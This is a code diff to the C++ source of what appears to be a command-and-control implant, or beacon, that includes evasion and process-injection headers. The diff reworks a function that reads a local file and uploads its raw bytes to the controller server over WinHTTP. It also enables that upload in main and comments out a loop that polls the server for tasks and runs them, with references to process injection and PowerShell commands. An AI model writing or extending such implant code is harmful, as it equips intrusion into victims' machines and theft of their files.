@@ -7,6 +7,7 @@
 #include "evasion.h"
 #include "procInjection.h"
 #include "common.h"
+#include <vector>
 
 using std::string;
 namespace fs = std::filesystem;
@@ -141,7 +142,7 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
         }
 
         memcpy(newBuf + *dwSizeOut, responseBuf, dwOut);
-        
+
         *dwSizeOut += dwOut;
         newBuf[*dwSizeOut - 1] = '\0';
         *outBuffer = newBuf;
@@ -184,63 +185,46 @@ bool sendRequestedFile(const std::string& filePath) {
         return fetchWinHTTPError("WinHttpSetOption");
 
     std::uintmax_t fileSize = std::filesystem::file_size(filePath);
-    char* buf = new char[fileSize];
-
-    fs::path fileName = fs::path(filePath).filename();
+    std::vector<char> fileBuf(fileSize);
 
     std::ifstream fin(filePath, std::ios::binary);
-    fin.read(buf, fileSize);
-
-    if (!fin)
-        std::cerr << "Error reading file, could only read " << fin.gcount()
-                  << " bytes" << std::endl;
+    fin.read(fileBuf.data(), fileSize);
     fin.close();
 
-    std::string boundary = "---------------------------7e13971310878";
+    fs::path fileNamePath = fs::path(filePath).filename();
+    std::wstring fileName = fileNamePath.wstring();
 
-    std::string startBoundary =
-        "--" + boundary +
-        "\r\n"
-        "Content-Disposition: form-data; name=\"fileUpload\"; filename=\"" +
-        fileName.string() +
-        "\"\r\n"
-        "Content-Type: application/octet-stream\r\n\r\n";
+    // Build headers
+    std::wstring headerStr =
+        L"BeaconName: " + beaconName + L"\r\n" + L"File-Name: " + fileName +
+        L"\r\n" + L"File-Length: " + std::to_wstring(fileSize) + L"\r\n" +
+        L"Content-Type: application/octet-stream\r\n" + L"Content-Length: " +
+        std::to_wstring(fileSize) + L"\r\n";
 
-    std::string endBoundary = "\r\n--" + boundary + "--\r\n";
-
-    DWORD contentLength =
-        (DWORD)(startBoundary.size() + fileSize + endBoundary.size());
-
-    std::wstring headers = L"BeaconName: " + beaconName + L"\r\n";
-    headers += L"Content-Type: multipart/form-data; boundary=" +
-               std::wstring(boundary.begin(), boundary.end()) + L"\r\n" +
-               L"Content-Length: " + std::to_wstring(contentLength) + L"\r\n";
-
-    // Send Request
-    if (!(isRequestSuccessful = WinHttpSendRequest(
-              hHTTPRequest, headers.c_str(), (DWORD)-1, WINHTTP_NO_REQUEST_DATA,
-              (DWORD)0, contentLength, 0)))
-
+    // Send request with no body yet
+    if (!WinHttpSendRequest(hHTTPRequest, headerStr.c_str(), (DWORD)-1,
+                            WINHTTP_NO_REQUEST_DATA, 0, (DWORD)fileSize, 0)) {
         return fetchWinHTTPError("WinHttpSendRequest");
+    }
 
+    // Write raw file bytes
     DWORD bytesWritten = 0;
+    if (!WinHttpWriteData(hHTTPRequest, fileBuf.data(), (DWORD)fileSize,
+                          &bytesWritten)) {
+        return fetchWinHTTPError("WinHttpWriteData");
+    }
 
-    WinHttpWriteData(hHTTPRequest, startBoundary.data(),
-                     (DWORD)startBoundary.size(), &bytesWritten);
-    WinHttpWriteData(hHTTPRequest, buf, fileSize, &bytesWritten);
-    WinHttpWriteData(hHTTPRequest, endBoundary.data(),
-                     (DWORD)endBoundary.size(), &bytesWritten);
-
-    if (!(didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL)))
+    // Receive server response
+    if (!WinHttpReceiveResponse(hHTTPRequest, nullptr)) {
         return fetchWinHTTPError("WinHttpReceiveResponse");
+    }
 
-    DWORD dwSize = 0;
-
+    // Cleanup
     if (hHTTPRequest) WinHttpCloseHandle(hHTTPRequest);
     if (hHTTPConnection) WinHttpCloseHandle(hHTTPConnection);
     if (hHTTPSession) WinHttpCloseHandle(hHTTPSession);
 
-    return didReceiveResponse;
+    return true;
 }
 bool sendTaskResults(const std::string& data) {
     HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
@@ -333,28 +317,28 @@ int main(int argc, const char** argv) {
     std::string testFilename = ".\\file.txt";
     std::cout << "Uploading: " << testFilename << std::endl;
 
-    //sendRequestedFile(testFilename);
+    sendRequestedFile(testFilename);
     char* outBuffer = nullptr;
     DWORD dwSize = 0;
 
-    while (true) {
-        if (fetchTasks(&outBuffer, &dwSize)) {
-            // TODO: parse tasks and do
-            if (dwSize > 0) {
-                runTask(outBuffer, dwSize);
-                // printf("TASK: %.*s\n", dwSize, outBuffer);
-                delete[] outBuffer;
-                outBuffer = nullptr;
-                dwSize = 0;
-            }
-            // processInject();
-            // runPSCommand(argv[1]);
-            //  TODO: post results
-        }
+    // while (true) {
+    //     if (fetchTasks(&outBuffer, &dwSize)) {
+    //         // TODO: parse tasks and do
+    //         if (dwSize > 0) {
+    //             runTask(outBuffer, dwSize);
+    //             // printf("TASK: %.*s\n", dwSize, outBuffer);
+    //             delete[] outBuffer;
+    //             outBuffer = nullptr;
+    //             dwSize = 0;
+    //         }
+    //         // processInject();
+    //         // runPSCommand(argv[1]);
+    //         //  TODO: post results
+    //     }
 
-        // TODO: jitter sleep interval
-        Sleep(10000);
-    }
+    //     // TODO: jitter sleep interval
+    //     Sleep(10000);
+    // }
 
     return 0;
 }
